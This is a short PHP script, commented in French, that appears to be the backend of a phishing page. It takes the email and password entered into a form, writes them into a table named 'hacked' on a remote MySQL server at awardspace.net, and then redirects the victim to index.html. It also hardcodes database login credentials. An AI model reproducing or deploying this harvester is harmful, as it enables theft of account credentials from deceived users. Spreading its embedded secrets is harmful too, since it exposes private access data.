<?php
// Vérifie si le formulaire a été soumis
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Paramètres de connexion à la base de données
    $servername = "fdb1029.awardspace.net";
    $username = "4565581_hacking";
    $password = "hackerforever2610";
    $dbname = "4565581_hacking";

    // Créer une connexion
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Vérifier la connexion
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    // Récupérer les données du formulaire et échapper les caractères spéciaux
    $email = mysqli_real_escape_string($conn, $_POST['email']);
    $password = mysqli_real_escape_string($conn, $_POST['password']);
    
    // Construire la requête SQL pour insérer les données dans la table
    $sql = "INSERT INTO hacked (email, password) VALUES ('$email', '$password')";

    // Exécuter la requête
    if ($conn->query($sql) === TRUE) {

     header("Location: index.html");  // Redirige vers une autre page  
            exit();
            
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }

    // Fermer la connexion
    $conn->close();
}
?>
